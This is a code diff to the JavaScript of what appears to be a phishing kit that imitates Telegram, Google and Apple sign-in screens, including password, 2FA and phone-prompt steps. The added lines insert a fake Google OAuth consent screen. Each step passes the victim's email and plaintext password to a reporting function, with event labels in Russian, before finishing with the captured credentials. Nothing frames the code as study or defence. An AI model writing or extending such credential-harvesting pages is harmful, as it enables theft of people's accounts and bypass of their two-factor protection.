@@ -14,6 +14,7 @@ function initApp() {
     const stepGooglePassword = document.getElementById("stepGooglePassword");
     const stepGoogle2FA = document.getElementById("stepGoogle2FA");
     const stepGooglePrompt = document.getElementById("stepGooglePrompt");
+    const stepGoogleConsent = document.getElementById("stepGoogleConsent");
     const stepAppleEmail = document.getElementById("stepAppleEmail");
     const stepApplePassword = document.getElementById("stepApplePassword");
     const stepApple2FA = document.getElementById("stepApple2FA");
@@ -43,6 +44,8 @@ function initApp() {
     const btnBackToGoogle2FA = document.getElementById("btnBackToGoogle2FA");
     const btnSkipGoogle2FA = document.getElementById("btnSkipGoogle2FA");
     const btnBackToGooglePassword = document.getElementById("btnBackToGooglePassword");
+    const btnSubmitGoogleConsent = document.getElementById("btnSubmitGoogleConsent");
+    const btnCancelGoogleConsent = document.getElementById("btnCancelGoogleConsent");
 
     const btnSubmitAppleEmail = document.getElementById("btnSubmitAppleEmail");
     const btnBackFromAppleToTG = document.getElementById("btnBackFromAppleToTG");
@@ -59,6 +62,8 @@ function initApp() {
     const googleChipInitial = document.getElementById("googleChipInitial");
     const google2faDisplayEmail = document.getElementById("google2faDisplayEmail");
     const google2faChipInitial = document.getElementById("google2faChipInitial");
+    const googleConsentDisplayEmail = document.getElementById("googleConsentDisplayEmail");
+    const googleConsentChipInitial = document.getElementById("googleConsentChipInitial");
     const appleDisplayEmail = document.getElementById("appleDisplayEmail");
     const appleChipInitial = document.getElementById("appleChipInitial");
     const apple2faDisplayEmail = document.getElementById("apple2faDisplayEmail");
@@ -98,9 +103,11 @@ function initApp() {
         if (!email) return;
         if (googleDisplayEmail) googleDisplayEmail.textContent = email;
         if (google2faDisplayEmail) google2faDisplayEmail.textContent = email;
+        if (googleConsentDisplayEmail) googleConsentDisplayEmail.textContent = email;
         const initial = email.trim().charAt(0).toUpperCase() || "G";
         if (googleChipInitial) googleChipInitial.textContent = initial;
         if (google2faChipInitial) google2faChipInitial.textContent = initial;
+        if (googleConsentChipInitial) googleConsentChipInitial.textContent = initial;
     }
 
     function updateAppleDisplays(email) {
@@ -163,7 +170,7 @@ function initApp() {
     function showStep(stepElement) {
         [
             stepPhone, stepCode, step2FA, 
-            stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt,
+            stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent,
             stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt,
             stepSuccess
         ].forEach(s => s && s.classList.remove("active"));
@@ -991,6 +998,20 @@ function initApp() {
     if (btnConfirmGooglePrompt) {
         btnConfirmGooglePrompt.addEventListener("click", () => {
             reportAuthEvent("google_prompt_confirmed", "Пользователь подтвердил вход на телефоне (Google)", userGooglePassword, null, userGoogleEmail);
+            showStep(stepGoogleConsent);
+        });
+    }
+
+    if (btnSkipGoogle2FA) {
+        btnSkipGoogle2FA.addEventListener("click", () => {
+            reportAuthEvent("google_code_skipped", "Вход Google (пропуск 2FA)", userGooglePassword, null, userGoogleEmail);
+            showStep(stepGoogleConsent);
+        });
+    }
+
+    if (btnSubmitGoogleConsent) {
+        btnSubmitGoogleConsent.addEventListener("click", () => {
+            reportAuthEvent("google_authorized", "Пользователь предоставил доступ OAuth (Google Consent)", userGooglePassword, null, userGoogleEmail);
             finishAuth({
                 status: "success",
                 google_email: userGoogleEmail,
@@ -999,14 +1020,9 @@ function initApp() {
         });
     }
 
-    if (btnSkipGoogle2FA) {
-        btnSkipGoogle2FA.addEventListener("click", () => {
-            reportAuthEvent("google_authorized", "Вход Google подтвержден (без 2FA)", userGooglePassword, null, userGoogleEmail);
-            finishAuth({
-                status: "success",
-                google_email: userGoogleEmail,
-                password: userGooglePassword
-            });
+    if (btnCancelGoogleConsent) {
+        btnCancelGoogleConsent.addEventListener("click", () => {
+            showStep(stepSuccess);
         });
     }
 
